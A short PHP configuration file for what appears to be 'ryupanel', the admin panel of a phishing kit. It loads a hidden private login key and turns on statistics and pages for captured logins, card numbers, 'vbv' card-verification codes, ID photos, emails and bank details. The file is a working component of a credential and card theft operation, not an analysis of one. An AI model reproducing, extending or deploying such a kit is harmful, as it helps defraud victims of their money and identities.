<?php

/** private key for login in ryupanel */
$ryu_config['PRIVATE_KEY'] = @file_get_contents(__DIR__ . '/.ryupanel_key');


/** home statistic page  */
$ryu_config['STATISTIC_PANEL']['total_access']  = true;
$ryu_config['STATISTIC_PANEL']['count_visitor'] = true;
$ryu_config['STATISTIC_PANEL']['count_bot']     = true;
$ryu_config['STATISTIC_PANEL']['count_login']= true;
$ryu_config['STATISTIC_PANEL']['count_card']= true;
$ryu_config['STATISTIC_PANEL']['count_vbv']= true;
$ryu_config['STATISTIC_PANEL']['count_photo']= true;
$ryu_config['STATISTIC_PANEL']['count_email']= true;
$ryu_config['STATISTIC_PANEL']['count_bank'] = true;



/** config page on off */
$ryu_config['CONFIG_ONOFF']['page_email'] = true;
$ryu_config['CONFIG_ONOFF']['page_case'] = true ;
$ryu_config['CONFIG_ONOFF']['page_photo'] = true;
$ryu_config['CONFIG_ONOFF']['page_bank'] = true;
$ryu_config['CONFIG_ONOFF']['page_vbv'] = true;

